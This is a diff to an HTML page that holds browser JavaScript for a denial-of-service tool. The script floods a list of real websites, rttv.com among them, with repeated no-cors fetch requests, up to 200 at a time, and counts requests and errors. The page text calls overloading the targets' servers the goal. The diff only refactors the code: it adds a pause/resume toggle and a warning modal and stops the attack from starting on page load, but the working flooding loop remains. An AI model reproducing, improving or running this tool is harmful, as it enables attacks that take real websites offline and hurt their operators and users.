@@ -137,7 +137,7 @@
     <h3>Session Status</h3>
     <p>The number of GET requests and error responses for each targeted website is shown below. Failure to fetch is normal! That means their servers are overloaded and dropping
         packets - which is the goal!</p>
-    <button type="button" class="btn btn-primary" onclick="togglePause();">Pause</button>
+    <button type="button" class="btn btn-primary" onclick="togglePause();">Resume</button>
     </div>
 
     <div id="stats" class="container">
@@ -360,33 +360,36 @@
             'https://rttv.com/': { number_of_requests: 0, number_of_errored_responses: 0 }
         };
 
-        // initialize variables
+        // Initialize variables
         var urls = Object.keys(targets);
-        var statRow = document.querySelector("#stats > .row");
-        var CONCURRENCY_LIMIT = 200;
         var queue = [];
-        var attack = true;
+        var attack = false;
+        const statRow = document.querySelector("#stats > .row");
+        const CONCURRENCY_LIMIT = 200;
+        const TIMEOUT = 2000;
+        const toggleButton = document.querySelector("div.desc .btn");
+        const myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {});
 
-        function togglePause () {
-            if (attack) {
-                attack = false;
-                document.querySelector("div.desc .btn").innerText = "Resume";
-            } else {
-                attack = true;
-                document.querySelector("div.desc .btn").innerText = "Pause";
-                for (var i=0; i<urls.length; i++) {
-                    flood(urls[i], i);
-                }
+        function floodAll() {
+            for (var i=0; i<urls.length; i++) {
+                flood(i);
             }
         }
-        window.onload = togglePause();
 
-        var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {})
-        myModal.toggle();
+        function togglePause() {
+            if (attack) {
+                attack = false;
+                toggleButton.innerText = "Resume";
+            } else {
+                attack = true;
+                toggleButton.innerText = "Pause";
+                floodAll();
+            }
+        }
 
-        async function fetchWithTimeout(resource, options) {
+        async function fetchWithTimeout(resource) {
             const controller = new AbortController();
-            const id = setTimeout(() => controller.abort(), options.timeout);
+            const id = setTimeout(controller.abort, TIMEOUT);
             return fetch(resource, {
                 signal: controller.signal,
                 mode: 'no-cors'
@@ -399,13 +402,14 @@
             });
         }
 
-        async function flood(target, n) {
+        async function flood(n) {
+            var target = urls[n];
             while (attack) {
                 if (queue.length > CONCURRENCY_LIMIT) {
                     await queue.shift()
                 }
                 queue.push(
-                    fetchWithTimeout(target, { timeout: 2000 })
+                    fetchWithTimeout(target)
                         .catch((error) => {
                             if (error.code === 20 /* ABORT */) {
                                 return;
@@ -420,9 +424,7 @@
                             }
                             targets[target].number_of_requests++;
                         })
-                        .finally(function() {
-                            updateTargetDisplay(n);
-                        })
+                        .finally(() => updateTargetDisplay(n))
                 )
             }
         }
@@ -456,10 +458,8 @@
             `;
         }
 
-        // Start DOS attack
-        for (var i=0; i<urls.length; i++) {
-            flood(urls[i], i);
-        }
+        // Show warning modal
+        myModal.toggle();
     </script>
 </body>
 
